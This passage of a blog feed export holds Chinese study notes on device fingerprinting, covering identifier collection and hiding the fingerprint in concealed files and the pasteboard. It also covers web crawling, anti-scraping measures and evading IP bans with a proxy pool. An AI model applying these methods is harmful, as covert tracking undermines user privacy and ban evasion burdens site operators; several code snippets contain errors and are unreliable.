:[input_n] <span class="string">&quot;r&quot;</span> (n)</span><br><span class="line">           );</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> __aarch64__</span></span><br><span class="line">__asm__(<span class="string">&quot;mov x0, %[input_n]\r\n&quot;</span></span><br><span class="line">            <span class="string">&quot;add x0, x0, x0\r\n&quot;</span></span><br><span class="line">            <span class="string">&quot;add x0, x0, x0\r\n&quot;</span></span><br><span class="line">            <span class="string">&quot;lsl x0, x0, #2\r\n&quot;</span></span><br><span class="line">            <span class="string">&quot;mov %[result_m], x0\r\n&quot;</span></span><br><span class="line">            :[result_m] <span class="string">&quot;=r&quot;</span> (m)</span><br><span class="line">            :[input_n] <span class="string">&quot;r&quot;</span> (n)</span><br><span class="line">           );</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">return</span> m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>q</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>test</title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[<h1>《App安全实战指南》笔记录</h1><h2 id="设备指纹">设备指纹</h2><ul><li>设备指纹是指可以用于唯一识别出该设备的设备特征或者标识。设备指纹作为对端设备风险识别的重要因素，也逐步从简单的设备ID发展为结合设备ID，风险环境检测及设备行为分析等多个维度的信息来识别当前设备ID的真实性。<br>设备指纹由设备固有的，难以篡改的，唯一的设备参数生成。<br>设备指纹通常使用设备的IMEI，设备序列号，MAC地址，广告追踪标识等设备硬软件信息，结合服务端算法计算设备唯一ID，保证在用户重装应用，升级系统等情况下依旧有唯一性。</li></ul><h3 id="设备指纹系统">设备指纹系统</h3><p>设备指纹并不仅要在客户端采集设备数据后生成一条设备标识字符串，还需要依靠一整套的设备指纹系统保证其唯一性和稳定性。</p><p>设备指纹系统分为两个模块：客户端和服务费。</p><p><strong>客户端</strong>负责采集设备的特征属性，将采集的原始设备数据隐藏到设备本地一份，同时上传到服务端一份。<strong>服务端</strong>接收客户端上传的原始设备数据，使用设备参数查询设备库。如果设备指纹库中已经有该设备的设备指纹则直接将其下发到客户端，如果设备库中未查询到该设备指纹，则通过设备指纹算法生成唯一标识设备的设备指纹，并将其下发客户端。</p><h3 id="设备数据采集">设备数据采集</h3><p>稳定性和唯一性是设备指纹所必须的特性，因此生成设备指纹所选择的设备参数也需要有这两个特性。</p><p>android设备</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">字段名称              字段含义                 特性</span><br><span class="line">imei/meid            国际移动设备识别码        相同厂商同型号设备存在小概率发生号码碰撞</span><br><span class="line">model                设备型号                 同厂商同型号设备，该参数相同</span><br><span class="line">screen               屏幕真实分辨率            同厂商同型号设备，该参数相同</span><br><span class="line"><span class="keyword">memory</span>               手机内存大小              同厂商同型号设备，该参数相同</span><br><span class="line">serialno             设备序列号                从android11开始，需申请相应权限，同型号设备存在                                              小概率发生号码碰撞</span><br><span class="line">drmuid               数字版权相关串号          不需要申请相应权限，高版本系统存在同一个设备中每个                                             应用获取的值不相同的情况</span><br><span class="line">oaid                 移动联盟设备唯一标识       仅能获取加入移动联盟厂商的设备的oaid</span><br><span class="line">cid                  SD卡序列号               不需要申请相应权限，存在获取失败的情况</span><br><span class="line">android_id           设备的唯一识别码          不需要申请相应权限,相同厂商同型号设备存在小概率发                                              生号码碰撞</span><br><span class="line"><span class="keyword">mac</span>                  设备网卡的<span class="keyword">MAC</span>地址         需要申请相应权限，高版本系统可能随机返回虚假<span class="keyword">MAC</span>地                                              址</span><br></pre></td></tr></table></figure><p>获取设备序列号serialno时不直接调用系统的接口，而采用反射的方式，能解决系统不提供调用接口的问题。</p><ul><li><p>如果当前版本大于7.0，直接</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">StringBuild <span class="type">serial</span> - <span class="built_in">new</span> StringBuild();</span><br><span class="line"><span class="type">serial</span>.append(Build.SERIAL);</span><br></pre></td></tr></table></figure><p>否则进行反射</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Class</span>&lt;?&gt; c=<span class="keyword">Class</span>.forName(&quot;android.os.SystemProperties&quot;);</span><br><span class="line"><span class="keyword">Method</span> <span class="keyword">get</span> =c.getMethod(&quot;get&quot;,String.<span class="keyword">class</span>);</span><br><span class="line"><span class="type">serial</span>.append((String)<span class="keyword">get</span>.invoke(c,&quot;ro.serialno&quot;));</span><br></pre></td></tr></table></figure></li><li><p>方法二：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FILE</span> <span class="comment">*fp;</span></span><br><span class="line"><span class="comment">*serialno = (char *)calloc(128,sizeof(char));</span></span><br><span class="line">fp=p<span class="meta">open</span>(<span class="string">&quot;cat /sys/devices/soc0/serial_number&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">fgets(<span class="comment">*serialno,128,fp);</span></span><br><span class="line">p<span class="meta">close</span>(fp);</span><br></pre></td></tr></table></figure></li></ul><p>获取drmuid，cid，mac见书160</p><p>客户端采集的设备数据直接决定了生成的设备指纹是否稳定和唯一有效，所以必须保证数据上报到服务器过程的安全性，为防止中间人攻击或者数据被替换，需要使用一整套加密和逻辑校验保证数据传输的安全。</p><p><strong>客户端</strong></p><ol><li>使用AES将采集的设备数据进行整体加密</li><li>结合当前用户的SESSIONID计算一个签名</li><li>将加密后设备数据和计算出的校验值进行拼接(可以用 . 分隔)，整体BASE64上传至服务端</li></ol><p><strong>服务端</strong></p><ol><li>对数据进行解析拆分，取出加密后的设备数据和客户端计算的签名</li><li>利用当前用户查询服务端存储的SESSIONID，使用和客户端一样的签名算法对加密数据进行签名</li><li>对比服务端和客户端的计算签名是否一致，一致则正常对上报的数据进行解密，否则丢弃</li></ol><h3 id="设备指纹生成">设备指纹生成</h3><p>为了保证设备指纹的稳定性，每次使用固定算法生成设备指纹时相关字段拼接顺序要保持一致，不能随机更换。如果生成设备指纹需要的设备参数获取失败或者获取的为无效值，则用空字符串替换该值，我们将新生成的设备指纹命名为SUID。</p><p>为了在服务端保证设备指纹的稳定性，要将新生成的设备指纹和生成设备指纹所用的核心设备特征逐个建立映射关系，形成多维度的映射关系存储矩阵。这样才保证在部分设备特征变动后设备指纹的稳定性和唯一性。</p><p>数据库存储矩阵的主要目的是在客户端存储的设备指纹失效或者丢失后，能够根据重新上报的设备数据查询到服务端存储的原始设备指纹，从而保证设备指纹的稳定性。</p><h3 id="设备指纹隐藏">设备指纹隐藏</h3><p>设备指纹能够保证稳定性和唯一性，除了依赖服务端外，还依赖设备指纹在客户端的存储逻辑。客户端每次使用设备指纹时会首先读取本地存储的设备指纹，只有本地读取失败，才会重新请求服务端获取设备指纹，防止高频率请求给服务端带来压力。</p><p>对于设备指纹存储在客户端的安全存储问题：</p><ul><li>客户端接收到服务端下发的设备指纹后对其进行加密处理，同时获取当前的时间戳结合加密后的设备指纹生成用于防篡改的签名。将加密后的设备指纹，防篡改签名和生成签名使用的时间戳整体base64，最后将处理后的设备指纹隐藏当前设备。</li></ul><p>Android<strong>的隐藏路径</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/sdcard/Android/.backup/.config             沙箱根目录创建隐藏文件</span><br><span class="line">/sdcard/DCIM/.config                        相册所在目录创建隐藏文件</span><br><span class="line">/sdcard/.tconfig                            sdcard根目录创建隐藏文件</span><br><span class="line">/sdcard/.SystemConfig/.backup/.config       sdcard根目录创建隐藏文件</span><br><span class="line">/sdcard/Android/data/包名/.backup/.config    应用沙箱目录创建隐藏文件</span><br></pre></td></tr></table></figure><p><strong>IOS隐藏路径</strong></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Preferenecs文件 </span>          应用的<span class="keyword">Preference属性设置文件</span></span><br><span class="line"><span class="keyword"></span>KeyChain                 钥匙串，苹果公司的密码管理系统</span><br><span class="line">Pasteboard               将要保护的数据隐藏在剪贴板</span><br></pre></td></tr></table></figure><h3 id="设备指纹应用">设备指纹应用</h3><p><strong>客户端</strong></p><p>当客户端使用设备指纹时，首先尝试通过客户端模块获取隐藏在程序目录或设备中的设备指纹，当设备中不存在隐藏的设备指纹或者隐藏设备指纹为无效值时，尝试通过服务端获取设备指纹</p><p>设备指纹系统中的客户端部分用于保证服务端将设备指纹下发到客户端后的稳定性，同时保证生成设备指纹所用特征值的稳定性，客户端每次使用设备指纹时首先要获取在设备本地隐藏的设备指纹，当设备本地没有设备指纹或者设备指纹无效时，就需要请求服务端获取新的设备指纹。服务端存储了设备指纹和设备特征值映射关系，通过设备特征值查询到当前设备的设备指纹，当服务端查询不到当前设备特征值对应的设备指纹时，就使用上报的设备特征值重新生成新的设备指纹，这就需要保证设备特征值不会随意变化，每次获取设备特征值时都要首先读取设备中隐藏的特征值，只有无法读取到隐藏的特征值时才会重新获取。</p><p><strong>服务端</strong></p><p>服务端主要作用就是生成设备指纹和保证设备指纹的稳定性，当服务端生成新的设备指纹时，除了需要存储设备指纹，同时存储它和设备特征映射关系。存储的映射关系中每条记录都会有3个基准设备特征值(screen，model,memory)和核心设备特征值。Android的核心特征值imei,serialno,drmuid,cid,android_idmac，ios设备核心特征值idfv,idfa,uuid</p><p>服务端查询结果数量和核心特征数量对应，设备指纹稳定性就是依赖这些查询结果实现的，规则如下：</p><ul><li>如果所有查询结果中匹配的核心特征数量不同，则以匹配数量最多的查询结果为准，取其对应设备指纹</li><li>如果所有查询结果中匹配的核心特征数量相同，则按核心特征值权重等级进行筛选</li><li>如果所有查询结果中都没匹配到核心特征，则认为是一个新设备，用特征值生成设备指纹。</li></ul><p>Android设备核心特征值权重等级：android_id&gt;serialno&gt;drmuid&gt;mac&gt;sdcard</p><p>IOS设备核心特征值权重等级:idfa&gt;idfv&gt;uuid</p><p><img src="assets/image-20250115120312613.png" alt="image-20250115120312613"></p>]]></content>
      
      
      <categories>
          
          <category> 演示 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 外挂标签 </tag>
            
            <tag> M </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[<h1>AST混淆与解混淆</h1><h1>Web网站的调试与抓包分析</h1><h2 id="Chrome开发者工具">Chrome开发者工具</h2><p>打开方式：</p><ul><li>F12</li><li>ctrl+shift+I组合</li><li>右击网页页面，点击检查</li><li>在右上角三个点 ==》 更多工具</li><li>在浏览器中新建窗口，使用上述任意方法打开开发者工具，在切回要调试的界面</li></ul><h3 id="Elements面板">Elements面板</h3><p>显示页面源码的DOM树，可以在这里进行增删改查。主要用来对页面进行修饰美化，它并不是源代码</p><p>获取源代码方式：</p><ul><li>右键 ==》查看源代码 或者 ctrl+u</li><li>source面板</li></ul><p>在Elements面板下断点(右击 ==》break on )</p><ul><li>子树修改：在节点子树发生修改时断点</li><li>属性修改：在节点属性发生修改时断点</li><li>移除节点：在节点被移除时发生断点</li></ul><h3 id="Console面板">Console面板</h3><p>点击某个节点：</p><ul><li>$0：对当前选中的节点进行引用</li><li>$1：对上一次选中的节点进行引用</li><li>以此类推 一直回溯到$4</li></ul><p>CSS选择器语法引用节点</p><ul><li>复制需要定位的节点的selector，使用document.querySelector(“路径”)</li><li>如果要选择所有符合CSS选择器语法的节点document.querySelectorAll</li></ul><p>观察与检查事件监听器</p><ul><li>monitorEvents()：监听目标事件信息</li><li>unmonitorEvents()：停止监听</li><li>getEventListeners()：获取DOM节点的监听器</li></ul><p>monitorEvents()第一个参数是要监听的对象，第二个参数是要监听的事件字符串或者字符串数组</p><p>Elements面板的Event Listeners可以看监听器</p><h3 id="Source面板">Source面板</h3><p>断点：如果表达式有多行，在其中手动一个断点，会断在下一个表达式上。</p><p>条件断点：表达式true才会断下</p><p>XHR/fetch Breakpoints：当xhr与url子串匹配时触发断点</p><p>如果想在xhr生命周期的某个阶段触发断点，可以在 Event Listener Breakpoints窗中查看XHR目录</p><h3 id="Application面板">Application面板</h3><p>可以查看和删除Cookie，但是不能修改Cookie值。</p><p>使用localstorage本地存储来存储键值对，可以在其中进行键值对的检查修改和删除操作</p><ul><li>setItem()：存储一个名称为key的值value，如果value存在就更新</li><li>getItem()：获取名称为key的value值，如果key不存在就null</li><li>removeItem()：删除名称为key的信息，</li><li>clear()：清空localstorage所有信息</li><li>key()：键的索引</li></ul><h3 id="js逆向技巧">js逆向技巧</h3><p>全局搜索：ctrl+shift+F</p><p>console插桩：条件表达式中添加console.log</p><p>复制console面板：</p><ul><li>copy()</li><li>JSON:stringify()</li><li>Object.toString()</li><li>CryptoJS.enc.Utf8.stringify() 需要在snippets添加CryptoJS加密库</li></ul><h2 id="本地覆盖">本地覆盖</h2><p>Chrome中</p><ul><li>source面板中切换到替换，选择要进行替换的文件夹，在网络面板中找到某个请求进行替换Save foroverrides菜单项</li><li>fiddler自动响应<img src="assets/image-20241112212044355.png" alt="image-20241112212044355"></li></ul><h1>爬虫与反爬虫</h1><p>完整爬虫流程：</p><ul><li>发起一次http请求</li><li>服务站点进行一次响应</li><li>对返回信息进行数据解析与清洗</li><li>数据存储到数据库或者本地文件</li></ul><p><img src="assets/image-20241112213016930.png" alt="image-20241112213016930"></p><h2 id="网络请求">网络请求</h2><h3 id="发送请求">发送请求</h3><p>http请求报文主要是四部分：请求行，请求头部，空行和请求体<img src="assets/image-20241112213004971.png" alt="image-20241112213004971"></p><h4 id="请求行">请求行</h4><p>主要有作用的是：请求方法，统一资源定位符，http协议版本</p><p>8中请求方法</p><ol><li>GET：向目标服务器请求资源，返回实体主体</li><li>POST：向目标服务器发送资源，例如提交表达</li><li>HEAD：与get类似，不过他用于获取报头，不会返回具体内容</li><li>PUT：向目标服务器发送数据以覆盖指定内容</li><li>DELETE：请求服务器删除URL指定内容</li><li>OPTIONS：返回目标服务器针对特定资源的HTTP请求方法</li><li>TRACE：用于测试诊断，回显服务器收到的请求</li><li>CONNECT：HTTP1.1协议预留给能够将链接修改为管道方式的代理服务器</li></ol><p><strong>Http1.0中只有前三种请求方法</strong></p><p>GET用于获取网页资源，POST常用来模拟登录</p><p>请求行中的<strong>统一资源定位符</strong>实际上就是<strong>URL</strong></p><h4 id="请求头部">请求头部</h4><p>请求头部主要由一系列键值对组成，用来说明服务器需要的附属信息，通常反爬虫就是在请求头部里进行，检测是否包含关键键值对，如果不存在或者数据不匹配就会被判定为机器人</p><p>常用8个键值对</p><ol><li>Accept-Charset：客户端可以接受的字符集</li><li>Cookie：网站用来识别身份所用的加密键值对，需要登录才能访问的网站通常需要携带</li><li>Connection：表示是否需要持久连接，close代表本次响应后连接可以被关闭</li><li>Content-Type：请求体数据类型</li><li>Content-Length：请求体的长度</li><li>Host：请求的主机名</li><li>Referer：指明用户从该URL出发到达此页面，常用于防盗链技术</li><li>User-Agent：服务器用来识别浏览器类型，可更改这个参数达到切换计算机端与手机端的效果</li></ol><h4 id="空行">空行</h4><p>必须存在于http请求头部之后，也就是输入“\n\r”，他的作用在于通知目标服务器此后不会再出现请求头部，将进入请求体。</p><h4 id="请求体">请求体</h4><p>在GET方法中一般不存在请求体，请求体适用于POST方法，内容是用户在填写表单时提交的数据，他的格式是用&amp;连接的键值对，如name=test&amp;password=123。</p><h3 id="解析响应">解析响应</h3><p>返回的http响应报文包含了客户端需要的数据，一般可以通过观察报文中的一些关键信息来确认响应的实际情况，http响应报文结构：<img src="assets/image-20241112231535605.png" alt="image-20241112231535605"></p><p>四个部分：状态行，响应头，空行，响应体。</p><p>状态行中包括状态码和状态码描述。</p><h4 id="响应行">响应行</h4><p>状态码state code主要由三位数字构成，第一位数字用来辨别响应类型，后两位用来区分</p><ul><li>1xx：服务器成功接收客户端请求，客户端可继续发请求</li><li>2xx：服务器成功接收请求，并着手进行处理</li><li>3xx：服务器要求客户端重定向</li><li>4xx：服务器表明客户端请求非法</li><li>5xx：服务器发生错误</li></ul><p>熟记的10种状态码：省略</p><h4 id="响应头">响应头</h4><p>不必对其有太多理解，偶尔观察几个键值对辅证响应状态码的描述。</p><ol><li>Location：在301或者302下返回的重定向后的url地址</li><li>Connect：close表示本次响应后连接将被关闭；keepalive表示长久连接，服务器会等待客户端下次请求</li><li>Server：服务器用来处理请求的软件信息及其版本，与http请求中User-agent类似，不过它代表服务器端信息</li></ol><h4 id="空行-2">空行</h4><p>响应头后必须加入“\n\r”，他的作用表示接下来进入响应体</p><h4 id="响应体">响应体</h4><h2 id="网络爬虫分类">网络爬虫分类</h2><p>网络爬虫分为通用网络爬虫，聚焦网络爬虫，增量式网络爬虫，深层网络爬虫</p><h3 id="通用网络爬虫">通用网络爬虫</h3><p>又叫全网爬虫，它的目标是整个互联网，爬取数据丰富，常用语搜索引擎中。往往从一个url开始，辗转爬取，最终拓展到整个网络。</p><p>深度优先爬取策略和广度优先爬取策略较为常见</p><ul><li>深度优先爬取策略：按照页面深度进行排序，一次访问一级URL，直到触底无法深入</li><li>广度优先爬取策略：按照页面内容目录层次进行划分，爬取完同一层次的URL才会继续下一层进行爬取</li></ul><h3 id="聚焦网络爬虫">聚焦网络爬虫</h3><p>更适用于日常爬虫的需要，并不需要爬取整个互联网数据，它专注于某一主题，选择性的爬取网页上与开发者定义的规则相匹配的数据资源</p><p>四种爬取策略</p><ol><li>基于内容评价：将用户输入的信息作为主题进行爬取，页面包含用户输入信息则认为与主题有关</li><li>基于链接评价：根据页面结构信息分析爬取的url的重要性，根据重要程度进行爬取优先级的排序</li><li>基于增强学习：利用概率统计中的贝叶斯分类器，根据网页内容和链接文本对URL进行分类，计算出URL的权重，来决定爬取顺序</li><li>基于语境图：结合机器学习系统，计算当前页面到相关的页面的距离，距离越近的页面的URL则越优先访问</li></ol><h3 id="增量式网络爬出">增量式网络爬出</h3><p>主要目的是长久的维持一个数据库，对数据的稳健性和实时性具有高要求，再次爬取时就会只爬取新出现的或者发生改变的数据，对于没有发生变化的页面或者数据不会爬取</p><p>三种常用策略</p><ol><li>统一更新：每隔一段时间将所有页面再访问一遍，以达到更新数据的目的</li><li>个体更新：根据个体网站的数据变化频率来指定重新访问时间</li><li>分类更新：将网页区分为数据变化迅速的和数据变化缓慢的，以不同频率访问这两类网页</li></ol><h3 id="深层网络爬虫">深层网络爬虫</h3><p>主要指的是没法直接访问的页面，这类页面信息通常要满足一定的要求才可以浏览，他隐藏在一些表单之后，不能通过静态链接直接获取。例如一些必须登录，注册后才能访问的网站。这类爬虫只需要搭配get和post请求就可以访问，难点在于破解post提交信息时的网页数据加密</p><p>两种策略</p><ol><li>基于领域知识：维护一个本地的词库，通过语义分析来选取合适的关键词填写表单</li><li>基于网页结构分析：在领域知识欠缺的情况下，根据网页结构进行分析，并自动填写表单</li></ol><h2 id="编写网络爬虫">编写网络爬虫</h2><h3 id="requests请求库使用">requests请求库使用</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://www.baidu.com/&quot;</span></span><br><span class="line"></span><br><span class="line">headers=&#123;<span class="string">&quot;user-agent&quot;</span>:</span><br><span class="line"><span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36&quot;</span>&#125;</span><br><span class="line">response=requests.get(url,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><h3 id="bs4解析库使用">bs4解析库使用</h3><p>'.'对应class属性，‘#’对应id属性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">url=<span class="string">&quot;http://www.baidu.com/&quot;</span></span><br><span class="line"></span><br><span class="line">headers=&#123;<span class="string">&quot;user-agent&quot;</span>:</span><br><span class="line"><span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36&quot;</span>&#125;</span><br><span class="line">response=requests.get(url,headers=headers)</span><br><span class="line"><span class="comment">#print(response.text)</span></span><br><span class="line">soup=BeautifulSoup(response.text,<span class="string">&#x27;lxml&#x27;</span>) <span class="comment">#lxml是一个解析器</span></span><br><span class="line">btn=soup.select_one(<span class="string">&#x27;#su&#x27;</span>) <span class="comment">#定位采用CSS选择器 定位精确 简便</span></span><br><span class="line"><span class="built_in">print</span>(btn[<span class="string">&#x27;value&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#因为bs4返回的节点都是python对象，所以获取html标签中的元素只需像python中获取字典形式一样去获取</span></span><br></pre></td></tr></table></figure><p>从请求角度，反爬虫可以在http数据包中进行</p><ol><li>要求用户注册登录才能查看数据，发包形式为GET与POST混合</li><li>添加User-Agent，Referer或者Cookie头部校验</li><li>增加验证码，将请求包中的参数进行js加密</li></ol><p>从数据角度，反爬虫可以通过阻碍爬虫开发者查看网页源代码来进行</p><ol><li>禁止用户右击或者f12</li><li>添加控制台反调试，使用无限循环debugger妨碍调试者</li><li>改变数据加载方式，使用Ajax动态加载</li><li>进行数据加密，返回的数据通过脚本文件解密后再展示</li><li>对加密脚本进行混淆，让爬虫者无法阅读源代码</li></ol><p>爬虫开发者与网站开发者对抗的<strong>五个阶段</strong></p><p><img src="assets/image-20241113144740357.png" alt="image-20241113144740357"></p><h1>常规反爬虫技巧</h1><h2 id="Headers头部校验">Headers头部校验</h2><p>对头部的三个主要键值对进行判断</p><ol><li>User-Agent：检测请求者的用户代理，此项缺失则判定为机器人</li><li>Referer：检测请求者是否以正常途径跳转到本页面，常用于防盗链技术</li><li>Cookie：检测请求者身份状态，需要登录才能访问的网站通常需要携带</li></ol><p>应对方法：直接复制请求头中相应键值对，需注意：需要登录才能访问的网站，Cookie有时效性，需要及时更新</p><p><strong>cookie传递</strong></p><p>需要登录才能获取网页数据，或者需要跨请求保持参数时，可以用session对象，自动管理Cookie，当用户登录一个页面，它可以自动识别response中Set-Cookie键值对，为后续请求维持这个Cookie来保持会话信息</p><p>下面是POST+GET例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#使用session共享cookie</span></span><br><span class="line">url=<span class="string">&quot;http://www.test.com/login&quot;</span></span><br><span class="line">data=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;test&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;12345&quot;</span>&#125;</span><br><span class="line">headers=&#123;<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;xxxxx&quot;</span>&#125;</span><br><span class="line">session=requests.session()</span><br><span class="line">session.headers=headers</span><br><span class="line">post_html=session.post(url,data=data) <span class="comment">#模拟登录</span></span><br><span class="line">get_html=session.get(<span class="string">&quot;http://www.test.com/get&quot;</span>) <span class="comment">#传递Cookie进行信息获取</span></span><br><span class="line"><span class="built_in">print</span>(get_html.text)</span><br></pre></td></tr></table></figure><h2 id="IP地址记录">IP地址记录</h2><p>防止短时间内大量发起http请求</p><p>这种反爬虫手段原理是检测异常访问的用户，如果有请求在短时间内连续访问网站数十次，对ip进行记录，判定为机器人，当该ip再次发起请求，响应403。</p><p>应对方法：</p><p>减缓http请求间隔，或者建立ip代理池，在进行请求时使用ip代理，被检测后更换ip即可。</p><p><strong>案例：豆瓣网站</strong></p><p><strong>1.用户延迟访问</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DelayRequests</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,delay=<span class="number">3</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.delay = delay</span><br><span class="line">        <span class="variable language_">self</span>.urls=&#123;&#125;</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wait</span>(<span class="params">self,url</span>):</span><br><span class="line">        netloc=parse.urlparse(url).netloc</span><br><span class="line">        <span class="built_in">print</span>(netloc)</span><br><span class="line">        lastone=<span class="variable language_">self</span>.urls.get(netloc,<span class="literal">False</span>)</span><br><span class="line">        <span class="built_in">print</span>(lastone)</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.delay&gt;<span class="number">0</span> <span class="keyword">and</span> lastone:</span><br><span class="line">            sleeptime=<span class="variable language_">self</span>.delay-(datetime.now()-lastone).seconds</span><br><span class="line">            <span class="keyword">if</span> sleeptime&gt;<span class="number">0</span>:</span><br><span class="line">                time.sleep(sleeptime)</span><br><span class="line">        <span class="variable language_">self</span>.urls[netloc]=datetime.now()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>记录爬取过的网站域名，如果下一次访问与上一次访问域名相同，且间隔在设置的延迟时间内，就让爬虫沉睡知道延迟时间跑满</p><p><strong>2.构建IP代理池</strong></p><p>爬取某快代理网站的免费代理，构建IP代理池的代码方案</p><p>网站的翻页url数字递增加一</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="comment">#所获取代理是否可用</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">proxy</span>): </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(<span class="string">&quot;要访问的目标url&quot;</span>, proxies=proxy, timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;获取可用代理&#123;&#125;&quot;</span>.<span class="built_in">format</span>(proxy))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;不可用代理&quot;</span>.<span class="built_in">format</span>(proxy))</span><br><span class="line">        </span><br><span class="line"><span class="comment">#获取代理</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_proxy</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        url=<span class="string">&#x27;http://www.kuaidaili.com/free/inha/&#123;&#125;&#x27;</span>,<span class="built_in">format</span>(i)</span><br><span class="line">        response =requests.get(url)</span><br><span class="line">        soup=BeautifulSoup(response)</span><br><span class="line">        datas=soup.select(<span class="string">&#x27;tbody tr&#x27;</span>)</span><br><span class="line">        proxies=&#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://localhost:8888&#x27;</span>,</span><br><span class="line">                 <span 